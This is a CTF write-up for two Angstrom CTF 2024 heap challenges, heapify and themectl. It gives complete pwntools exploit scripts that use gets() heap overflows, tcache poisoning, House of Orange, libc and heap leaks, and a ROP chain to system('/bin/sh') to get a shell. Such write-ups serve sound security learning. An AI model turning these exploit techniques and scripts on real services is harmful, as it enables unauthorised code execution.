---
title: 'Angstrom CTF 2024 - Pwnable write-up'
description: 'Write up for some challenge in Angstrom CTF 2024'
date: 2024-05-28
tags:
   - 'CTF'
   - 'PWN'
   - '2024'
---
---
On this CTF events, I solved 5 out of 8 challenges during the the event. For the others, I asked for some hints after the CTF ended and solve all of them. On this write-up, I'll explain two most interesting challenge, which is `themectl` and `heapify`, which are the only two heap challenge in the event.
## Heapify
### Analysing
This is a straight forward heap challenge with a heap bof.
```c 
void alloc() {
	if(idx >= N) {
		puts("you've allocated too many chunks");
		return;
	}
	printf("chunk size: ");
	int size = readint();
	char *chunk = malloc(size);
	printf("chunk data: ");

	// ----------
	// VULN BELOW !!!!!!
	// ----------
	gets(chunk);
	// ----------
	// VULN ABOVE !!!!!!
	// ----------
	
	printf("chunk allocated at index: %d\n", idx);
	chunks[idx++] = chunk;
}
```
![image](https://hackmd.io/_uploads/Sy3s1pEEC.png)

Other than that, there are no UAF, no edit option.
### Exploit
#### Leaking libc address
As usual, for our exploit, we need to get the address of libc. For this challenge, there is a heap bof, so we can overwrite metadata of adjacent chunk. Because of that, making overlapping chunks is easy.

To get the addresses, I take advantage of splitting mechanism of unsorted bin chunks. The freed unsorted bin containing libc address is still overlap with our malloc'd chunks. If we malloc a size less than the chunk in the unsorted bin, that chunk will be splitted into two parts and use one for allocation, the other still in the unsorted bin. I can control how much we malloc to make the remaining chunk fall right into our pointer, so I can use view to leak libc.
```python 
malloc(0x8,b'') # 1
malloc(0x208,b'') # 2
malloc(0x8,b'') # 3
malloc(0x208,b'') # 4
malloc(0x8,b'') # 5
free(1)
malloc(0x8,b'a'*0x18 + p32(0x441)) # 6
free(2)
malloc(0x208,b'')  # 7
leak = view(3)
leak = u64(leak.strip().ljust(8,b'\x00'))
libc_base = leak - 0x21ace0
```
### Leaking heap address
I will use tcache poisoning technique, so leaking heap address is required. As the previous free chunk is in the same spot as our controlled pointer, we malloc to get a chunk there, then free to put it in tcachebin. Then we are left with heap address.
```python 
log.info('Base libc @ ' + hex(libc_base))
log.info('Leaked: ' + hex(leak))
# Leaking heap
malloc(0x8,b'') # 8
malloc(0x8,b'') # 9
free(8)
leak = view(3)
heap_key = u64(leak.strip().ljust(8,b'\x00'))
log.info('Leaked: ' + hex(heap_key)) 
libc.address = libc_base
```
### Getting the shell
Since we can only perform aaw, I cannot leak the environ from libc. My choice to go was using one_gadget and pray.
```python 
# Tcache poison
malloc(0x30,b'') # 10
malloc(0x100,b'') # 11
malloc(0x100,b'') # 12
free(12)
free(11)
free(10)
malloc(0x30, b'a'*0x38 + p64(0x51) + p64(0x21a090 + libc.address ^ heap_key) ) # 13
malloc(0x100,b'a') # 14
gadget =0xebc88+libc.address
malloc(0x100, p64(gadget)*3 ) #15
free(0)
free(0)
chall.interactive()
```
### Solve script
```python 
from pwn import *
import sys

#context.log_level = 'debug'
context.binary = exe = ELF('./heapify')
# nc = 'challs.actf.co'
# p = 31501
nc = 'localhost'
p = 5000
libc = ELF('./libc.so.6')
if sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      set solib-search-path /home/aneii/ctf/angstrom24/dist/
                      set sysroot /home/aneii/ctf/angstrom24/dist/
                      b *main+63
                      c
                      b *exit
                      clear *main+63
                      c
                      ''')
elif sys.argv[1] == 'connect':
    chall = remote(nc, p)
else:
    chall = process()
    
def malloc(size, msg):
    chall.sendlineafter(b'choice: ', b'1')
    chall.sendlineafter(b'size: ',str(size).encode())
    chall.sendlineafter(b'data: ',msg)
    
def free(idx):
    chall.sendlineafter(b'choice: ',b'2')
    chall.sendlineafter(b'index: ',str(idx).encode())
    
def view(idx):
    chall.sendlineafter(b'choice: ',b'3')
    chall.sendlineafter(b'index: ',str(idx).encode())
    return chall.recvline()    

malloc(0x10,b'a'*0x10)
# Leaking libc
malloc(0x8,b'') # 1
malloc(0x208,b'') # 2
malloc(0x8,b'') # 3
malloc(0x208,b'') # 4
malloc(0x8,b'') # 5
free(1)
malloc(0x8,b'a'*0x18 + p32(0x441)) # 6
free(2)
malloc(0x208,b'')  # 7
leak = view(3)
leak = u64(leak.strip().ljust(8,b'\x00'))
libc_base = leak - 0x21ace0
log.info('Base libc @ ' + hex(libc_base))
log.info('Leaked: ' + hex(leak))
# Leaking heap
malloc(0x8,b'') # 8
malloc(0x8,b'') # 9
free(8)
leak = view(3)
heap_key = u64(leak.strip().ljust(8,b'\x00'))
log.info('Leaked: ' + hex(heap_key)) 
libc.address = libc_base
# Tcache poison
malloc(0x30,b'') # 10
malloc(0x100,b'') # 11
malloc(0x100,b'') # 12
free(12)
free(11)
free(10)
malloc(0x30, b'a'*0x38 + p64(0x51) + p64(0x21a090 + libc.address ^ heap_key) ) # 13
malloc(0x100,b'a') # 14
gadget =0xebc88+libc.address
malloc(0x100, p64(gadget)*3 ) #15
free(0)
free(0)
chall.interactive()
```
![image](https://hackmd.io/_uploads/rkngPTVVA.png)
## Themectl
This is also a heap challenge, in which is no free option.
### Reversing
First, we need to sign in. Let's take a look at `create_user`, as this one is important in my exploit.
```c 
[...]
printf("Enter your password: ");
fgets(password, 300, stdin);
password[strcspn(password, "\n")] = 0;
printf("How many themes would you like? ");
fgets(nptr, 32, stdin);
v1 = atoi(nptr);
if ( v1 <= 0 )
v1 = -v1;
v6 = v1;
themes = (char *)malloc(8 * (v1 + 1LL));
user_data = (char **)malloc(0x18uLL);
v2 = strlen(username);
*user_data = (char *)malloc(v2 + 1);
strcpy(*user_data, username);
v3 = strlen(password);
user_data[1] = (char *)malloc(v3 + 1);
strcpy(user_data[1], password);
user_data[2] = themes;
*(_QWORD *)user_data[2] = v6;
for ( j = 0; userlist[j]; ++j )
;
user_index = j;
userlist[j] = (usr *)user_data;
cur_user = (__int64)user_data;
return 0LL;
```
First, it mallocs 2 chunks to place our username and password there. Then, it mallocs a chunk to store user theme addresses, which is our actual controlled chunks.
Let's take a look at heap options.
```c 
case 1:
            printf("Which theme would you like to edit? ");
            fgets(s, 32, stdin);
            v6 = atoi(s);
            if ( v6 < 0 || (unsigned __int64)v6 >= **(_QWORD **)(cur_user + 16) )
            {
              puts("Not a valid index.");
            }
            else
            {
              printf("Enter a theme idea: ");
              if ( *(_QWORD *)(*(_QWORD *)(cur_user + 16) + 8LL * v6 + 8) )
              {
                gets(*(_QWORD *)(*(_QWORD *)(cur_user + 16) + 8LL * v6 + 8));
              }
              else
              {
                v8 = malloc(0x20uLL);
                gets(v8);
                *(_QWORD *)(*(_QWORD *)(cur_user + 16) + 8LL * v6 + 8) = v8;
              }
            }
            break;
```
It uses `gets` to read our input, so we have a heap bof again. But this time, there's no free option, so we cannot use the same technique for this challenge.
The other options are view and edit, which are self-explanatory.
### Approach
User info and our theme are both placed at heap. There was a clear bof for our input, so we can fully overwrite user info for easy aaw and aar if chunks are aligned reasonably.
For that, I register as user 1, then malloc 1 chunk for user 1, then register as user 2. Right now, we can control user 2 data.
```python 
register(b'1',b'1',100)
malloc(0,b'')
logout()
register(b'2',b'2',4)
```
### Leaking heap address
When malloc a new chunk, it place the address in the user chunk. I take the advantage of it to leak the address of the heap. I write just enough "A" as user 1 so that the address user 2 will be right next to our input. When I used view, the address will be printed along with my input.
```python 
logout()
login(b'1',b'1')
malloc(0,b'a'*7*8 + p64(0))
logout()
login(b'2',b'2')
malloc(0,b'')
logout()
login(b'1',b'1')
leaked = leak(0)
heap_base = u64(leaked[7*8+1:7*8+7].strip().ljust(8,b'\x00')) & 0xfffffffff000
log.info('Base heap @ ' + hex(heap_base))
```
### Leaking libc address
For now, we can control aaw and aar in the heap. To get libc address on the heap, I use House of Orange technique to call `_int_free`. Then I just straght up read that address from user 2, as we already have aar.
```python 

logout()
login(b'1',b'1')
malloc(0,p64(0)*5+ p64(0x31) + p64(4)+p64(heap_base+0x880))
malloc(1,b'a'*0x28+p64(0x7f1))
logout()
register(b'3',b'3',500) # Register as user 3 to malloc a large chunk
logout() 
login(b'2',b'2')
leaked = leak(0)
libc.address = u64(leaked.strip().ljust(8,b'\x00')) - 0x21ace0
log.info('Libc @ '+hex(libc.address))
```
### Getting the shell
For this challenge, I leak stack frame address through environ to perfome a rop on there. Again, we have aaw and aar so this is just easy peasy.
```python 
logout()
login(b'1',b'1')
malloc(0,p64(0)*5+ p64(0x31) + p64(4)+p64(libc.sym["environ"]))
logout()
login(b'2',b'2')
environ = u64(leak(0).strip().ljust(8,b'\x00'))
saved_rip = environ - 0x120
log.info('Environ @ ' + hex(environ))
log.info("Stack frame @ " + hex(saved_rip))
logout()
login(b'1',b'1')
malloc(0,p64(0)*5+ p64(0x31) + p64(4)+p64(saved_rip))
logout()
login(b'2',b'2')
pop_rdi = 0x2a3e5
payload = flat([
    0x29139 + libc.address,
    pop_rdi + libc.address,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym["system"]
])
malloc(0,payload)
chall.interactive()
```
### Solve script
```python 
from pwn import *

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
context.binary = exe = ELF('./themectl')
if sys.argv[1] == 'debug':
    chall = gdb.debug(exe.path, '''
                      set solib-search-path /usr/lib/x86_64-linux-gnu/
                      c
                      ''')
elif sys.argv[1] == 'connect':
    chall = remote(nc, p)
else:
    chall = process()

def logout():
    chall.sendlineafter(b'> ',b'4')
def login(name,passw):
    chall.sendlineafter(b'> ',b'2')
    chall.sendlineafter(b'name: ',name)
    chall.sendlineafter(b'word: ',passw)
def register(name,passw,num_chunk):
    chall.sendlineafter(b'> ', b'1')
    chall.sendlineafter(b'name: ', name)
    chall.sendlineafter(b'word: ',passw)
    chall.sendlineafter(b'? ',str(num_chunk).encode())


def malloc(idx, msg):
    chall.sendlineafter(b'>', b'1')
    chall.sendlineafter(b'? ',str(idx).encode())
    chall.sendlineafter(b'idea: ',msg)
    
def leak(idx):
    chall.sendlineafter(b'> ',b'2')
    chall.sendlineafter(b'?',str(idx).encode())
    return chall.recvline()

register(b'1',b'1',100)
malloc(0,b'')
logout()
register(b'2',b'2',4)
logout()
login(b'1',b'1')
malloc(0,b'a'*7*8 + p64(0))
logout()
login(b'2',b'2')
malloc(0,b'')
logout()
login(b'1',b'1')
leaked = leak(0)
heap_base = u64(leaked[7*8+1:7*8+7].strip().ljust(8,b'\x00')) & 0xfffffffff000
log.info('Base heap @ ' + hex(heap_base))

logout()
login(b'1',b'1')
malloc(0,p64(0)*5+ p64(0x31) + p64(4)+p64(heap_base+0x880))
malloc(1,b'a'*0x28+p64(0x7f1))
logout()
register(b'3',b'3',500)
logout()
login(b'2',b'2')
leaked = leak(0)
libc.address = u64(leaked.strip().ljust(8,b'\x00')) - 0x21ace0
log.info('Libc @ '+hex(libc.address))
logout()
login(b'1',b'1')
malloc(0,p64(0)*5+ p64(0x31) + p64(4)+p64(libc.sym["environ"]))
logout()
login(b'2',b'2')
environ = u64(leak(0).strip().ljust(8,b'\x00'))
saved_rip = environ - 0x120
log.info('Environ @ ' + hex(environ))
log.info("Stack frame @ " + hex(saved_rip))
logout()
login(b'1',b'1')
malloc(0,p64(0)*5+ p64(0x31) + p64(4)+p64(saved_rip))
logout()
login(b'2',b'2')
pop_rdi = 0x2a3e5
payload = flat([
    0x29139 + libc.address,
    pop_rdi + libc.address,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym["system"]
])
malloc(0,payload)
chall.interactive()
```
![image](https://hackmd.io/_uploads/H1TNJ0VEC.png)
